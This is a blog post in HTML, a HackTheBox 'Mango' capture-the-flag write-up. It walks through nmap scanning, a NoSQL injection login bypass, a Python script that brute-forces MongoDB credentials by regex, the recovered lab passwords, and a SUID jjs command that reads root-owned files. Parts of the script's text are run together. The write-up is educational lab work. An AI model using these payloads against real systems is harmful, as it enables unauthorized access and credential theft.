@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="Ajdin Trejić">
+    <meta name="description" content="Reconnaissance Let’s run nmap,
+sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
+Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference: staging-order.">
+    <meta name="keywords" content="blog,developer,personal,write-up">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox :: Mango Write Up"/>
+<meta name="twitter:description" content="Reconnaissance Let’s run nmap,
+sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
+Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference: staging-order."/>
+
+    <meta property="og:title" content="HackTheBox :: Mango Write Up" />
+<meta property="og:description" content="Reconnaissance Let’s run nmap,
+sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
+Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference: staging-order." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ajdintrejic.github.io/posts/htb-mango/" />
+<meta property="article:published_time" content="2020-04-18T13:28:11+02:00" />
+<meta property="article:modified_time" content="2020-04-18T13:28:11+02:00" />
+
+
+    
+      <base href="http://ajdintrejic.github.io/posts/htb-mango/">
+    
+    <title>
+  HackTheBox :: Mango Write Up · ajdintrejic
+</title>
+
+    
+      <link rel="canonical" href="http://ajdintrejic.github.io/posts/htb-mango/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="http://ajdintrejic.github.io/css/coder.min.8ca1e620659915ffe2eb0a01ebc407d0da2d96ce00f1eb885d93612840044b64.css" integrity="sha256-jKHmIGWZFf/i6woB68QH0Notls4A8euIXZNhKEAES2Q=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="http://ajdintrejic.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="http://ajdintrejic.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.70.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="http://ajdintrejic.github.io/">
+      ajdintrejic
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="http://ajdintrejic.github.io/about/">About</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="http://ajdintrejic.github.io/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="http://ajdintrejic.github.io/cv/">CV</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">HackTheBox :: Mango Write Up</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-04-18T13:28:11&#43;02:00'>
+                April 18, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              4-minute read
+            </span>
+          </div>
+        </div>
+      </header>
+
+      <div>
+        
+          <img src='http://ajdintrejic.github.io/htb-mango/mango_info_card.png' alt="Featured image"/>
+        
+
+	
+	  <hr>
+	  <h6 id="toc">Table of Contents</h6>
+	  <div> <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#getting-user-account">Getting user account</a>
+      <ul>
+        <li><a href="#nosql-injection">NoSQL injection</a></li>
+        <li><a href="#bruteforcing-the-password">Bruteforcing the password</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-root-account">Getting root account</a>
+      <ul>
+        <li><a href="#privilege-escalation-with-jjs">Privilege escalation with JJS</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav> </div>
+	  <hr>
+	
+
+
+        <h2 id="reconnaissance">Reconnaissance</h2>
+<p>Let’s run nmap,</p>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
+</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-mango/nmap_initial_results.png" alt="nmap"></p>
+<p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/mango_search_page.png" alt="page"></p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/mango_analytics_page.png" alt="page"></p>
+<h2 id="getting-user-account">Getting user account</h2>
+<p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
+staging-order.mango.htb</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/ssl_certificate.png" alt="ssl"></p>
+<p>The page is inaccessible, but we can use the /etc/hosts file to redirect the page back to the server itself. You could also change the headers of the https request and change the host value to “staging-order.mango.htb”.</p>
+<p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
+<p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/etc_hosts.png" alt="hosts"></p>
+<h3 id="nosql-injection">NoSQL injection</h3>
+<p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/login_mongodb.png" alt="login"></p>
+<p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
+<p>I opened the network tab in Firefox and tried to login with “admin” and “test”. This will send a POST request. We can open it and see the request body.</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/network_tab.png" alt="network"></p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/request.png" alt="request"></p>
+<p>Edit the request:</p>
+<p>Before:</p>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
+</code></pre></div><p>After:</p>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
+</code></pre></div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/request_reply.png" alt="reply"></p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/after_login.png" alt="afterlogin"></p>
+<h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
+<p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
+<p>You should change the cookie ID.</p>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">requests</span>
+<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">stringurl</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#34;http://example.com&#34;</span>
+headers <span style="color:#666">=</span> {<span style="color:#4070a0">&#34;Host&#34;</span>: <span style="color:#4070a0">&#34;exmaple.com&#34;</span>}
+cookies <span style="color:#666">=</span> {<span style="color:#4070a0">&#34;PHPSESSID&#34;</span>: <span style="color:#4070a0">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
+possible_chars <span style="color:#666">=</span> <span style="color:#007020">list</span>(string<span style="color:#666">.</span>ascii_letters) <span style="color:#666">+</span> <span style="color:#007020">list</span>(string<span style="color:#666">.</span>digits) <span style="color:#666">+</span> [<span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\\</span><span style="color:#4070a0">&#34;</span><span style="color:#666">+</span>c <span style="color:#007020;font-weight:bold">for</span> c <span style="color:#007020;font-weight:bold">in</span> string<span style="color:#666">.</span>punctuation<span style="color:#666">+</span>string<span style="color:#666">.</span>whitespace ]<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_password</span>(username):
+    <span style="color:#007020;font-weight:bold">print</span>(<span style="color:#4070a0">&#34;Extracting password of &#34;</span><span style="color:#666">+</span>username)
+    params <span style="color:#666">=</span> {<span style="color:#4070a0">&#34;username&#34;</span>:username, <span style="color:#4070a0">&#34;password[$regex]&#34;</span>:<span style="color:#4070a0">&#34;&#34;</span>, <span style="color:#4070a0">&#34;login&#34;</span>: <span style="color:#4070a0">&#34;login&#34;</span>}
+    password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;^&#34;</span>
+    <span style="color:#007020;font-weight:bold">while</span> True:
+        <span style="color:#007020;font-weight:bold">for</span> c <span style="color:#007020;font-weight:bold">in</span> possible_chars:
+            params[<span style="color:#4070a0">&#34;password[$regex]&#34;</span>] <span style="color:#666">=</span> password <span style="color:#666">+</span> c <span style="color:#666">+</span> <span style="color:#4070a0">&#34;.*&#34;</span>
+            pr <span style="color:#666">=</span> requests<span style="color:#666">.</span>post(url, data<span style="color:#666">=</span>params, headers<span style="color:#666">=</span>headers, cookies<span style="color:#666">=</span>cookies, verify<span style="color:#666">=</span>False, allow_redirects<span style="color:#666">=</span>False)
+            <span style="color:#007020;font-weight:bold">if</span> <span style="color:#007020">int</span>(pr<span style="color:#666">.</span>status_code) <span style="color:#666">==</span> <span style="color:#40a070">302</span>:
+                password <span style="color:#666">+=</span> c
+                <span style="color:#007020;font-weight:bold">break</span>
+        <span style="color:#007020;font-weight:bold">if</span> c <span style="color:#666">==</span> possible_chars[<span style="color:#666">-</span><span style="color:#40a070">1</span>]:
+            <span style="color:#007020;font-weight:bold">print</span>(<span style="color:#4070a0">&#34;Found password &#34;</span><span style="color:#666">+</span>password[<span style="color:#40a070">1</span>:]<span style="color:#666">.</span>replace(<span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\\</span><span style="color:#4070a0">&#34;</span>, <span style="color:#4070a0">&#34;&#34;</span>)<span style="color:#666">+</span><span style="color:#4070a0">&#34; for username &#34;</span><span style="color:#666">+</span>username)
+            <span style="color:#007020;font-weight:bold">return</span> password[<span style="color:#40a070">1</span>:]<span style="color:#666">.</span>replace(<span style="color:#4070a0">&#34;</span><span style="color:#4070a0;font-weight:bold">\\</span><span style="color:#4070a0">&#34;</span>, <span style="color:#4070a0">&#34;&#34;</span>)<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_usernames</span>():
+    usernames <span style="color:#666">=</span> []
+    params <span style="color:#666">=</span> {<span style="color:#4070a0">&#34;username[$regex]&#34;</span>:<span style="color:#4070a0">&#34;&#34;</span>, <span style="color:#4070a0">&#34;password[$regex]&#34;</span>:<span style="color:#4070a0">&#34;.*&#34;</span>, <span style="color:#4070a0">&#34;login&#34;</span>: <span style="color:#4070a0">&#34;login&#34;</span>}
+    <span style="color:#007020;font-weight:bold">for</span> c <span style="color:#007020;font-weight:bold">in</span> possible_chars:
+        username <span style="color:#666">=</span> <span style="color:#4070a0">&#34;^&#34;</span> <span style="color:#666">+</span> c
+        params[<span style="color:#4070a0">&#34;username[$regex]&#34;</span>] <span style="color:#666">=</span> username <span style="color:#666">+</span> <span style="color:#4070a0">&#34;.*&#34;</span>
+        pr <span style="color:#666">=</span> requests<span style="color:#666">.</span>post(url, data<span style="color:#666">=</span>params, headers<span style="color:#666">=</span>headers, cookies<span style="color:#666">=</span>cookies, verify<span style="color:#666">=</span>False, allow_redirects<span style="color:#666">=</span>False)
+        <span style="color:#007020;font-weight:bold">if</span> <span style="color:#007020">int</span>(pr<span style="color:#666">.</span>status_code) <span style="color:#666">==</span> <span style="color:#40a070">302</span>:
+            <span style="color:#007020;font-weight:bold">print</span>(<span style="color:#4070a0">&#34;Found username starting with &#34;</span><span style="color:#666">+</span>c)
+            <span style="color:#007020;font-weight:bold">while</span> True:
+                <span style="color:#007020;font-weight:bold">for</span> c2 <span style="color:#007020;font-weight:bold">in</span> possible_chars:
+                    params[<span style="color:#4070a0">&#34;username[$regex]&#34;</span>] <span style="color:#666">=</span> username <span style="color:#666">+</span> c2 <span style="color:#666">+</span> <span style="color:#4070a0">&#34;.*&#34;</span>
+                    <span style="color:#007020;font-weight:bold">if</span> <span style="color:#007020">int</span>(requests<span style="color:#666">.</span>post(url, data<span style="color:#666">=</span>params, headers<span style="color:#666">=</span>headers, cookies<span style="color:#666">=</span>cookies, verify<span style="color:#666">=</span>False, allow_redirects<span style="color:#666">=</span>False)<span style="color:#666">.</span>status_code) <span style="color:#666">==</span> <span style="color:#40a070">302</span>:
+                        username <span style="color:#666">+=</span> c2
+                        <span style="color:#007020;font-weight:bold">print</span>(username)
+                        breakif c2 <span style="color:#666">==</span> possible_chars[<span style="color:#666">-</span><span style="color:#40a070">1</span>]:
+                    <span style="color:#007020;font-weight:bold">print</span>(<span style="color:#4070a0">&#34;Found username: &#34;</span><span style="color:#666">+</span>username[<span style="color:#40a070">1</span>:])
+                    usernames<span style="color:#666">.</span>append(username[<span style="color:#40a070">1</span>:])
+                    <span style="color:#007020;font-weight:bold">break</span>
+    <span style="color:#007020;font-weight:bold">return</span> usernamesfor u <span style="color:#007020;font-weight:bold">in</span> get_usernames():
+    get_password(u)
+</code></pre></div><p>This will run for some time, the output is:</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/password_bruteforce.png" alt="success"></p>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
+mango:h3mXK8RhU~f{]f5H
+</code></pre></div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/user_txt.png" alt="usertxt"></p>
+<h2 id="getting-root-account">Getting root account</h2>
+<p>First, I switch from sh to bash by running /bin/bash.</p>
+<p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
+<p><img src="http://ajdintrejic.github.io/htb-mango/jjs.png" alt="jjs"></p>
+<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
+<p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
+<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
+</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-mango/root_txt.png" alt="roottxt"></p>
+<p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+      
+        ©
+        
+          2019 -
+        
+        2020
+         Ajdin Trejić 
+      
+      
+      
+    </section>
+  </footer>
+
+    </main>
+
+    
+
+    
+
+    
+
+  </body>
+
+</html>
